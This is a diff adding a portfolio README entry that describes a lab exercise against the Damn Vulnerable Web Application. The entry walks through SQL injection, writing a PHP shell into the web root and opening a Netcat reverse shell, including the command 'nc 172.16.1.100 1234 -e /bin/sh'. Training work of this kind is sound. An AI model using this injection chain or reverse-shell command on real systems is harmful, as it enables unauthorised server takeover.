@@ -143,6 +143,56 @@ As a big fan of sudoku, I spent hours solving these puzzles in my free time. Thi
 <a href="https://github.com/Speedycray/Sudoku-Solver">Github Link</a>
 
 
+
+# [DVWA](https://github.com/digininja/DVWA)
+![alt text](dvwa.jpeg)
+
+Damn Vulnerable Web Application (DVWA) is a PHP/MySQL web application that is vulnerable. I was able to perform a reverse shell via SQL Injection in the app. I pulled a DVWA Docker image into my Kali Linux VM where I was able to access DVWA in a premade environment. DVWA has a section for practicing SQL injections and the option to set the difficulty from Low to Impossible. To demonstrate Proof of Concept, I performed the attack on Low security. 
+
+Firstly, I tested to see if inputting a single quotation mark will return an error. Sure enough, it does. Now I've confirmed that this is vulnerable to SQL Injections. Next I used the 'order by' operator to confirm the amount of columns, in this case it was 2 since running "' order by 3 #' returned an error. This is important as it will help format the following injection. I used the UNION operator to inject a PHP script into a file within the root folder of the server which allowed us to access it via URL. Now from the URL, I could access the shell VIA URL.
+
+To get a reverse shell from the server, I set up a Netcat listener on my attacking machine "nc -lvp 1234" listening on port 1234. From the URL where we had access to the shell, I sent the command, "nc 172.16.1.100 1234 -e /bin/sh" and that returned a reverse shell back to the Netcat Listener. Now I had control of the server!
+
+I did encounter a permissions error when trying to write a file to the server. When running that injection, I got an access denied error from MySQL where the current user did not have enough permissions. To resolve this, I needed to login to the docker container and go into MySQL as root. I then ran the command to grant all permissions to the user. This fixed the issue!
+
+### **Reources:**
+*  [Github](https://github.com/digininja/DVWA)
+*  [Docker Image](https://hub.docker.com/r/vulnerables/web-dvwa/)
+*  [Use SQL Injection to Run OS Commands & Get a Shell](https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/)
+
+### **Skills:** 
+*  Docker
+*  MySQL / Apache2
+*  SQL Injection / Command Injection
+*  PHP Script
+*  Netcat
+
+### **Results:**
+*  Performed SQL Injections and Command Injections returning valuable information
+*  Able to run shell commands through URL of vulnerable site
+*  Opened reverse shell in attacking machine
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 <!---
 
 ### Markdown
